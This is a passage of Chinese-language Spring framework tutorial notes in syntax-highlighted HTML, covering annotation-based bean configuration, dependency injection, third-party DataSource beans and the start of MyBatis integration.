class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token punctuation">(</span><span class="token string">"bookDao"</span><span class="token punctuation">)</span> <span class="token comment">//获取bean时使用类名获取</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookDaoImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookDao</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Component</span> <span class="token comment">//获取bean的时候使用类.class获取</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookService</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>核心配置文件中通过组件扫描加载 bean   要添加 context 命名空间</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">?</span><span class="token operator">></span><span class="token operator">&lt;</span>beans xmlns<span class="token operator">=</span><span class="token string">"http://www.springframework.org/schema/beans"</span>       xmlns<span class="token operator">:</span>context<span class="token operator">=</span><span class="token string">"http://www.springframework.org/schema/context"</span>       xmlns<span class="token operator">:</span>xsi<span class="token operator">=</span><span class="token string">"http://www.w3.org/2001/XMLSchema-instance"</span>       xsi<span class="token operator">:</span>schemaLocation<span class="token operator">=</span>"       http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>org<span class="token operator">/</span>schema<span class="token operator">/</span>beans        http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>org<span class="token operator">/</span>schema<span class="token operator">/</span>beans<span class="token operator">/</span>spring<span class="token operator">-</span>beans<span class="token punctuation">.</span>xsd       http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>org<span class="token operator">/</span>schema<span class="token operator">/</span>context        http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>org<span class="token operator">/</span>schema<span class="token operator">/</span>context<span class="token operator">/</span>spring<span class="token operator">-</span>context<span class="token punctuation">.</span>xsd"<span class="token operator">></span>    <span class="token operator">&lt;</span>context<span class="token operator">:</span>component<span class="token operator">-</span>scan base<span class="token operator">-</span><span class="token keyword">package</span><span class="token operator">=</span><span class="token string">"com.itheima.dao.impl"</span> <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>context<span class="token operator">:</span>component<span class="token operator">-</span>scan base<span class="token operator">-</span><span class="token keyword">package</span><span class="token operator">=</span><span class="token string">"com.itheima.service.impl"</span> <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>beans<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>Spring 提供了三个衍生注解 @Service，@Repository，@Controller<ul><li>@Repository 数据层</li><li>@Service 服务层</li><li>@Controller 表现层</li></ul></li></ul><h2 id="182-纯注解开发"><a class="markdownIt-Anchor" href="#182-纯注解开发">#</a> 18.2 纯注解开发</h2><ul><li>Spring3.0 开启了纯注解的开发模式，使用 Java 类替代配置文件，开启了 Spring 快速开发通道</li><li>Java 类替代 Spring 核心配置文件</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token string">"com.itheima"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AppForAnnotation</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ApplicationContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationConfigApplicationContext</span><span class="token punctuation">(</span><span class="token class-name">SpringConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//注意使用的类名</span>        <span class="token class-name">BookDao</span> bookDao <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"bookDao"</span><span class="token punctuation">,</span> <span class="token class-name">BookDao</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bookDao<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>@Configuration 注解用于设定当前类为配置类</li><li>@ComponentScan 注解用于设定扫描路径，此注解只能添加一次，多个数据请用数组格式</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"com.itheima.service"</span><span class="token punctuation">,</span> <span class="token string">"com.itheima.dao"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>容器对象获取也需要更换类</li></ul><pre class="line-numbers language-none"><code class="language-none">ApplicationContext ctx &#x3D; new AnnotationConfigApplicationContext(SpringConfig.class); <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="19-注解开发bean管理"><a class="markdownIt-Anchor" href="#19-注解开发bean管理">#</a> 19、注解开发 bean 管理</h1><h2 id="191-作用范围"><a class="markdownIt-Anchor" href="#191-作用范围">#</a> 19.1 作用范围</h2><ul><li>在类定义前使用注解指定作用范围<ul><li>singleton 单例</li><li>prototype 多例</li></ul></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token punctuation">(</span><span class="token string">"bookDao"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Scope</span><span class="token punctuation">(</span><span class="token string">"singleton"</span><span class="token punctuation">)</span><span class="token comment">//singleton单例</span><span class="token comment">//prototype多例</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookDaoImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookDao</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="192-生命周期"><a class="markdownIt-Anchor" href="#192-生命周期">#</a> 19.2 生命周期</h2><ul><li>使用 @PostConstruct（初始化）和 @PreDestroy（销毁）注解写在方法前定义初始化和销毁方法</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token punctuation">(</span><span class="token string">"bookDao"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Scope</span><span class="token punctuation">(</span><span class="token string">"singleton"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookDaoImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookDao</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book dao save ......"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@PostConstruct</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"init"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@PreDestroy</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"destroy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="20-注解开发依赖注入"><a class="markdownIt-Anchor" href="#20-注解开发依赖注入">#</a> 20、注解开发依赖注入</h1><h2 id="201-自动装配"><a class="markdownIt-Anchor" href="#201-自动装配">#</a> 20.1 自动装配</h2><ul><li>使用 @Autowired 注解开启自动装配模式 (按类型)</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token annotation punctuation">@Scope</span><span class="token punctuation">(</span><span class="token string">"singleton"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookService</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">BookDao</span> bookDao<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book service save ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bookDao<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>注意：自动装配基于反射设计创建对象并暴力反射对应属性为私有属性初始化数据，因此无需提供 setter 方法</li><li>注意：自动转配建议使用<mark>无参构造方法</mark>创建对象（默认），如果不提供对应构造方法，请提供唯一的构造方法</li><li>使用 @Qualifier 注解开启指定名称装配 Bean</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"> <span class="token annotation punctuation">@Service</span><span class="token annotation punctuation">@Scope</span><span class="token punctuation">(</span><span class="token string">"singleton"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookService</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token annotation punctuation">@Qualifier</span><span class="token punctuation">(</span><span class="token string">"boookDao"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">BookDao</span> bookDao<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>注意：@Qualifier 注解无法单独使用，必须配合 @Autowired 注解使用</li></ul><h2 id="201-简单类型注入"><a class="markdownIt-Anchor" href="#201-简单类型注入">#</a> 20.1 简单类型注入</h2><ul><li>使用 @Value 实现简单类型注入</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Repository</span><span class="token annotation punctuation">@Scope</span><span class="token punctuation">(</span><span class="token string">"singleton"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookDaoImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookDao</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"itheima666"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="202-加载外部properties文件"><a class="markdownIt-Anchor" href="#202-加载外部properties文件">#</a> 20.2 加载外部 properties 文件</h2><ul><li>使用 @Properties 注解加载 properties 文件</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token string">"com.itheima"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@PropertySource</span><span class="token punctuation">(</span><span class="token string">"jdbc.properties"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>注意：路径仅支持单一文件配置，多文件使用数组格式配置，不允许使用通配符 *</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookService</span><span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">BookDao</span> bookDao<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"$&#123;name&#125;"</span><span class="token punctuation">)</span><span class="token comment">//使用$&#123;&#125;的方式加载配置文件的变量</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"30"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book service save ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">"  :  "</span> <span class="token operator">+</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>        bookDao<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="21-注解开发第三方bean管理"><a class="markdownIt-Anchor" href="#21-注解开发第三方bean管理">#</a> 21、注解开发第三方 bean 管理</h1><h2 id="211-第三方bin管理"><a class="markdownIt-Anchor" href="#211-第三方bin管理">#</a> 21.1 第三方 bin 管理</h2><ul><li>管理第三方 bean，由于不能将注解直接写在源代码中，只能使用编程的方法配置</li><li>使用 @Bean 配置第三方 bean，在配置文件里写</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringConfig</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//1.定义方法获得要管理的对象</span>    <span class="token comment">//2.添加@Bean，表示当前方法的返回值是一个bean</span>    <span class="token annotation punctuation">@Bean</span><span class="token punctuation">(</span><span class="token string">"dataSource"</span><span class="token punctuation">)</span>    <span class="token comment">//bean名可以不写，通过类获取bean</span>    <span class="token keyword">public</span> <span class="token class-name">DataSource</span> <span class="token function">dataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">DruidDataSource</span> ds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DruidDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ds<span class="token punctuation">.</span><span class="token function">setDriverClassName</span><span class="token punctuation">(</span><span class="token string">"com.mysql.jdbc.Driver"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ds<span class="token punctuation">.</span><span class="token function">setUrl</span><span class="token punctuation">(</span><span class="token string">"jdbc:mysql://localhost:3306/spring_db"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ds<span class="token punctuation">.</span><span class="token function">setUsername</span><span class="token punctuation">(</span><span class="token string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ds<span class="token punctuation">.</span><span class="token function">setPassword</span><span class="token punctuation">(</span><span class="token string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ds<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">App</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">AnnotationConfigApplicationContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationConfigApplicationContext</span><span class="token punctuation">(</span><span class="token class-name">SpringConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">DataSource</span> dataSource <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">DataSource</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>dataSource<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>不建议将 bean 方法直接写到配置类里，要将方法写到独立的配置文件里</li><li>方式一：导入式 —— 建议使用</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JDBCConfig</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token comment">//bean名可以不写，通过类获取bean</span>    <span class="token keyword">public</span> <span class="token class-name">DataSource</span> <span class="token function">dataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">DruidDataSource</span> ds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DruidDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ds<span class="token punctuation">.</span><span class="token function">setDriverClassName</span><span class="token punctuation">(</span><span class="token string">"com.mysql.jdbc.Driver"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ds<span class="token punctuation">.</span><span class="token function">setUrl</span><span class="token punctuation">(</span><span class="token string">"jdbc:mysql://localhost:3306/spring_db"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ds<span class="token punctuation">.</span><span class="token function">setUsername</span><span class="token punctuation">(</span><span class="token string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ds<span class="token punctuation">.</span><span class="token function">setPassword</span><span class="token punctuation">(</span><span class="token string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ds<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token comment">//使用@Import注解手动加入配置类到核心配置，此注解只能添加一次，多个数据请用数组格式</span><span class="token annotation punctuation">@Import</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token class-name">JDBCConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>方式二：扫描式 —— 不建议使用</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"com.itheima.config"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="212-第三方bean注入资源"><a class="markdownIt-Anchor" href="#212-第三方bean注入资源">#</a> 21.2 第三方 bean 注入资源</h2><h3 id="2121-简单类型依赖注入"><a class="markdownIt-Anchor" href="#2121-简单类型依赖注入">#</a> 21.2.1 简单类型依赖注入</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JDBCConfig</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"com.mysql.jdbc.Driver"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> driver<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"jdbc:mysql://localhost:3306/spring_db"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> url<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"root"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> userName<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"root"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> password<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token comment">//bean名可以不写，通过类获取bean</span>    <span class="token keyword">public</span> <span class="token class-name">DataSource</span> <span class="token function">dataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">DruidDataSource</span> ds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DruidDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ds<span class="token punctuation">.</span><span class="token function">setDriverClassName</span><span class="token punctuation">(</span>driver<span class="token punctuation">)</span><span class="token punctuation">;</span>        ds<span class="token punctuation">.</span><span class="token function">setUrl</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>        ds<span class="token punctuation">.</span><span class="token function">setUsername</span><span class="token punctuation">(</span>userName<span class="token punctuation">)</span><span class="token punctuation">;</span>        ds<span class="token punctuation">.</span><span class="token function">setPassword</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ds<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2122-引用类型依赖注入"><a class="markdownIt-Anchor" href="#2122-引用类型依赖注入">#</a> 21.2.2 引用类型依赖注入</h3><ul><li>引用类型注入只需要在方法写形参即可，会<mark>自动进行注入操作</mark></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Bean</span><span class="token comment">//bean名可以不写，通过类获取bean</span><span class="token keyword">public</span> <span class="token class-name">DataSource</span> <span class="token function">dataSource</span><span class="token punctuation">(</span><span class="token class-name">BookDao</span> bookDao<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    bookDao<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">DruidDataSource</span> ds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DruidDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ds<span class="token punctuation">.</span><span class="token function">setDriverClassName</span><span class="token punctuation">(</span>driver<span class="token punctuation">)</span><span class="token punctuation">;</span>    ds<span class="token punctuation">.</span><span class="token function">setUrl</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>    ds<span class="token punctuation">.</span><span class="token function">setUsername</span><span class="token punctuation">(</span>userName<span class="token punctuation">)</span><span class="token punctuation">;</span>    ds<span class="token punctuation">.</span><span class="token function">setPassword</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ds<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>引用类型注入只需要为 bean 定义方法设置形参即可，容器会根据类型自动装配 bean 对象，bean 对象要设置为 bean</li></ul><h1 id="22-注解开发总结"><a class="markdownIt-Anchor" href="#22-注解开发总结">#</a> 22、注解开发总结</h1><h2 id="221-xml配置对比注解配置"><a class="markdownIt-Anchor" href="#221-xml配置对比注解配置">#</a> 22.1 XML 配置对比注解配置</h2><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220831214024201.png" alt="image-20220831214024201"></p><h1 id="23-spring整合mybatis"><a class="markdownIt-Anchor" href="#23-spring整合mybatis">#</a> 23、Spring 整合 MyBatis</h1><h2 id="231-思路分析"><a class="markdownIt-Anchor" href="#231-思路分析">#</a> 23.1 思路分析</h2><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220929205826386.png" alt="image-20220929205826386"></p><ul><li>最核心的对象：sqlSessionFactory</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220929205902781.png" alt="image-20220929205902781"></p><h2 id="232-整合mybatis"><a class="markdownIt-Anchor" href="#232-整合mybatis">#</a> 23.2 整合 mybatis</h2><ol><li>导入坐标</li></ol><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.mybatis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>mybatis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.5.6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token 